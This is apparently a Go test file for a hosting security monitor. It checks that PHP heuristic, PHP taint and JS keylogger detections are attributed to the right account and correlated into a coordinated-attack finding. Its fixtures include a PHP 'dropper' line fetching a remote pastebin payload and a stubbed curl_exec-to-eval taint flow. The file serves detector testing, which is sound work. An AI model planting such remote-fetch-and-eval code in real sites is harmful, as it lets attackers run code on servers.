package checks

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/pidginhost/csm/internal/alert"
	"github.com/pidginhost/csm/internal/config"
	"github.com/pidginhost/csm/internal/phptaint"
)

// The three content analysers (PHP heuristics, PHP taint, JS taint) each
// name the file they judged, so the owner resolves from the path.
func TestContentFindingsAttributeByPath(t *testing.T) {
	root := t.TempDir()
	withAccountHomeRoots(t, root)
	docroot := filepath.Join(root, "alice", "public_html")
	if err := os.MkdirAll(filepath.Join(docroot, "wp-content"), 0o755); err != nil {
		t.Fatal(err)
	}

	// PHP heuristics: one indicator is the High-severity suspicious family.
	dropper := filepath.Join(docroot, "dropper.php")
	if err := os.WriteFile(dropper, []byte("<?php\n$payload = file_get_contents('https://pastebin.com/raw/abc123');\n"), 0o644); err != nil { // #nosec G306 -- docroot fixture
		t.Fatal(err)
	}
	var findings []alert.Finding
	newPHPContentScan(&config.Config{}, nil, false).scanFile(context.Background(), dropper, phpHandlerOverlay{}, &findings)

	// PHP taint: the worker is stubbed, the adapter still stamps the path.
	withPHPTaintAnalyzer(t, func(context.Context, []byte) phptaint.Report {
		return phptaint.Report{
			Status:       phptaint.StatusAnalyzed,
			TotalResults: 1,
			Results: []phptaint.Result{{
				Source: "curl_exec", Sink: "eval",
				Confidence: phptaint.ConfidenceCertain, Identifiers: []string{"$p"},
				Basis: phptaint.BasisAlwaysRemote, ResolutionOffset: -1,
			}},
		}
	})
	taintPath := filepath.Join(docroot, "loader.php")
	findings = append(findings, analyzePHPTaintSnapshot(context.Background(), taintPath, "sha", nil, newPHPTaintGapCollector())...)

	// JS taint runs in-process through the deep scan over the account root.
	useRollingStore(t)
	useNilYARABackend(t)
	probe := writeYARADeepFile(t, root, "alice/public_html/wp-content/probe.js", jsKeyloggerFixture)
	findings = append(findings, jsFindingsByCheck(CheckYARADeep(context.Background(), &config.Config{AccountRoots: []string{root}}, nil), "js_keylogger_dataflow")...)

	seen := expectAttributed(t, findings, "alice")
	requireChecks(t, seen, "suspicious_php_content", "php_remote_taint", "js_keylogger_dataflow")
	for _, f := range findings {
		if f.Check == "js_keylogger_dataflow" && f.FilePath != probe {
			t.Errorf("js finding path %q, want %q", f.FilePath, probe)
		}
	}

	anchors := []alert.Finding{critical("db_rogue_admin", "bob"), critical("db_rogue_admin", "carol")}
	res := CorrelateFindings(append(anchors, findings...))
	if len(res.Derived) != 1 || res.Derived[0].Check != "coordinated_attack" {
		t.Fatalf("critical content output did not aggregate: %+v", res)
	}
	if len(res.Unattributed) != 0 {
		t.Fatalf("unattributed content rows %v", res.Unattributed)
	}
}
